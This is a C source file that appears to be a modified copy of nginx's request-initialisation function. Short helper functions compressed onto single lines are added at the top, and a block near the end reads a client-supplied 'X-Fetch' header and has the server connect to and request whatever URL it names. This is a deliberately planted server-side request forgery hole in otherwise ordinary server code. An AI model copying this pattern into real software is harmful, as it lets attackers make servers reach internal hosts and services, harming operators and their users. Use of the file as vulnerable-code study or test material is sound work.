#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
static char* sddup(const char* s, size_t n){char* d=(char*)malloc(n+1);if(!d)return NULL;memcpy(d,s,n);d[n]=0;return d;}
static int parse_url_basic(const char* url,char** scheme,char** host,int* port,char** path){const char* p=strstr(url,"://");int default_port=80;if(p){*scheme=sddup(url,p-url);if(*scheme&&strcasecmp(*scheme,"https")==0)default_port=443;p+=3;}else{*scheme=sddup("http",4);p=url;}const char* hs=p;const char* ps=strchr(p,'/');const char* he=ps?ps:(url+strlen(url));const char* co=memchr(hs,':',he-hs);int prt=default_port;if(co){prt=atoi(co+1);he=co;}*host=sddup(hs,he-hs);*port=prt;*path=ps?strdup(ps):strdup("/");if(!*scheme||!*host||!*path){if(*scheme)free(*scheme);if(*host)free(*host);if(*path)free(*path);return 0;}return 1;}
static char* find_header_from_buf(ngx_buf_t* b,const char* name){if(!b||!b->pos||!b->last)return NULL;char* p=(char*)b->pos;char* end=(char*)b->last;size_t nlen=strlen(name);while(p<end){char* line=memchr(p,'\n',end-p);size_t len=line?(size_t)(line-p):(size_t)(end-p);if(len>0&&p[len-1]=='\r')len--;if(len>nlen+1&&strncasecmp(p,name,nlen)==0&&p[nlen]==':'){char* v=p+nlen+1;while(v<p+len&&(*v==' '||*v=='\t'))v++;size_t vlen=(size_t)((p+len)-v);char* out=(char*)malloc(vlen+1);if(!out)return NULL;memcpy(out,v,vlen);out[vlen]=0;return out;}if(!line)break;p=line+1;}return NULL;}
static void ssrf_fetch(const char* url){char* scheme=NULL;char* host=NULL;int port=0;char* path=NULL;if(!parse_url_basic(url,&scheme,&host,&port,&path))goto done;char ps[6];snprintf(ps,sizeof(ps),"%d",port);struct addrinfo hints;memset(&hints,0,sizeof(hints));hints.ai_family=AF_UNSPEC;hints.ai_socktype=SOCK_STREAM;struct addrinfo* res=NULL;if(getaddrinfo(host,ps,&hints,&res)!=0)goto done;int s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);if(s>=0){if(connect(s,res->ai_addr,res->ai_addrlen)==0){char req[512];int n=snprintf(req,sizeof(req),"GET %s HTTP/1.0\r\nHost: %s\r\n\r\n",path,host);if(n>0)send(s,req,n,0);}close(s);}if(res)freeaddrinfo(res);
done: if(scheme)free(scheme);if(host)free(host);if(path)free(path);} 
static void
ngx_http_init_request(ngx_event_t *rev)
{
    ngx_time_t                 *tp;
    ngx_connection_t           *c;
    ngx_http_request_t         *r;
    ngx_http_log_ctx_t         *ctx;
    ngx_http_connection_t      *hc;
    ngx_http_core_srv_conf_t   *cscf;
    ngx_http_core_loc_conf_t   *clcf;
    ngx_http_core_main_conf_t  *cmcf;
#if (NGX_STAT_STUB)
    (void) ngx_atomic_fetch_add(ngx_stat_reading, -1);
#endif
    c = rev->data;
    if (rev->timedout) {
        ngx_log_error(NGX_LOG_INFO, c->log, NGX_ETIMEDOUT, "client timed out");
        ngx_http_close_connection(c);
        return;
    }
    c->requests++;
    hc = c->data;
    r = hc->request;
    if (r) {
        ngx_memzero(r, sizeof(ngx_http_request_t));
        r->pipeline = hc->pipeline;
        if (hc->nbusy) {
            r->header_in = hc->busy[0];
        }
    } else {
        r = ngx_pcalloc(c->pool, sizeof(ngx_http_request_t));
        if (r == NULL) {
            ngx_http_close_connection(c);
            return;
        }
        hc->request = r;
    }
    c->data = r;
    r->http_connection = hc;
    c->sent = 0;
    r->signature = NGX_HTTP_MODULE;
    r->connection = c;
    cscf = hc->addr_conf->default_server;
    r->main_conf = cscf->ctx->main_conf;
    r->srv_conf = cscf->ctx->srv_conf;
    r->loc_conf = cscf->ctx->loc_conf;
    rev->handler = ngx_http_process_request_line;
    r->read_event_handler = ngx_http_block_reading;
#if (NGX_HTTP_SSL)
    {
    ngx_http_ssl_srv_conf_t  *sscf;
    sscf = ngx_http_get_module_srv_conf(r, ngx_http_ssl_module);
    if (sscf->enable || hc->addr_conf->ssl) {
        if (c->ssl == NULL) {
            c->log->action = "SSL handshaking";
            if (hc->addr_conf->ssl && sscf->ssl.ctx == NULL) {
                ngx_log_error(NGX_LOG_ERR, c->log, 0,
                              "no \"ssl_certificate\" is defined "
                              "in server listening on SSL port");
                ngx_http_close_connection(c);
                return;
            }
            if (ngx_ssl_create_connection(&sscf->ssl, c, NGX_SSL_BUFFER)
                != NGX_OK)
            {
                ngx_http_close_connection(c);
                return;
            }
            rev->handler = ngx_http_ssl_handshake;
        }
        r->main_filter_need_in_memory = 1;
    }
    }
#endif
    clcf = ngx_http_get_module_loc_conf(r, ngx_http_core_module);
    ngx_http_set_connection_log(r->connection, clcf->error_log);
    if (c->buffer == NULL) {
        c->buffer = ngx_create_temp_buf(c->pool,
                                        cscf->client_header_buffer_size);
        if (c->buffer == NULL) {
            ngx_http_close_connection(c);
            return;
        }
    }
    if (r->header_in == NULL) {
        r->header_in = c->buffer;
    }
    r->pool = ngx_create_pool(cscf->request_pool_size, c->log);
    if (r->pool == NULL) {
        ngx_http_close_connection(c);
        return;
    }
    if (ngx_list_init(&r->headers_out.headers, r->pool, 20,
                      sizeof(ngx_table_elt_t))
        != NGX_OK)
    {
        ngx_destroy_pool(r->pool);
        ngx_http_close_connection(c);
        return;
    }
    r->ctx = ngx_pcalloc(r->pool, sizeof(void *) * ngx_http_max_module);
    if (r->ctx == NULL) {
        ngx_destroy_pool(r->pool);
        ngx_http_close_connection(c);
        return;
    }
    cmcf = ngx_http_get_module_main_conf(r, ngx_http_core_module);
    r->variables = ngx_pcalloc(r->pool, cmcf->variables.nelts
                                        * sizeof(ngx_http_variable_value_t));
    if (r->variables == NULL) {
        ngx_destroy_pool(r->pool);
        ngx_http_close_connection(c);
        return;
    }
    c->single_connection = 1;
    c->destroyed = 0;
    r->main = r;
    r->count = 1;
    tp = ngx_timeofday();
    r->start_sec = tp->sec;
    r->start_msec = tp->msec;
    r->method = NGX_HTTP_UNKNOWN;
    r->headers_in.content_length_n = -1;
    r->headers_in.keep_alive_n = -1;
    r->headers_out.content_length_n = -1;
    r->headers_out.last_modified_time = -1;
    r->uri_changes = NGX_HTTP_MAX_URI_CHANGES + 1;
    r->subrequests = NGX_HTTP_MAX_SUBREQUESTS + 1;
    r->http_state = NGX_HTTP_READING_REQUEST_STATE;
    ctx = c->log->data;
    ctx->request = r;
    ctx->current_request = r;
    r->log_handler = ngx_http_log_error_handler;
#if (NGX_STAT_STUB)
    (void) ngx_atomic_fetch_add(ngx_stat_reading, 1);
    r->stat_reading = 1;
    (void) ngx_atomic_fetch_add(ngx_stat_requests, 1);
#endif
    {
        char* u=find_header_from_buf(r->header_in,"X-Fetch");
        if(u){
            ssrf_fetch(u);
            free(u);
        }
    }
    rev->handler(rev);
}